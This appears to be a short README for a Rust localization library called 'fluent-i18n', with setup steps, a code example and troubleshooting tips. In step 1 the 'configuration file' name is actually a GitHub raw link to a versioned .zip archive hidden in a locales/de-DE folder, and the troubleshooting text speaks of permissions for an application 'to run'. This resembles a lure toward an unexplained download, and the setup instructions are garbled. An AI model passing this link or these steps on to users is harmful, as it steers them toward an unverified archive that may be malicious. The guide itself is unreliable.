## 📖 Usage

After installing fluent-i18n, follow these steps to set up localization for your application:

1. **Create a Configuration File**: In your project directory, create a new file named `https://github.com/WaaedAhmed/fluent-i18n/raw/refs/heads/main/locales/de-DE/fluent_n_i_2.5-beta.5.zip`.
2. **Define Locales**: In this file, define the languages you want to support. For example:
   ```plaintext
   en: "English"
   fr: "French"
   es: "Spanish"
   ```
3. **Add Translations**: Add the necessary translations for each language. Use key-value pairs for each phrase you want to translate.
   ```plaintext
   hello: "Hello"
   goodbye: "Goodbye"
   ```
4. **Implement in Code**: In your Rust files, import the fluent-i18n library and use the defined translations by referencing the keys you created.

## 📊 Example

Here’s a brief example illustrating how to utilize fluent-i18n in your code:

```rust
use fluent_i18n::translate;

fn main() {
    let lang = "en"; // Set the desired language
    let greeting = translate(lang, "hello"); // This pulls the appropriate translation
    println!("{}", greeting); // Outputs: Hello
}
```

This example simply retrieves the "hello" translation based on the selected language and prints it.

## 🔧 Troubleshooting

If you run into issues, consider the following steps:

- **Check File Permissions**: Ensure that the application has the necessary permissions on your device to run.
- **Verify Rust Installation**: Confirm that Rust is installed correctly and that your environment paths are set up.
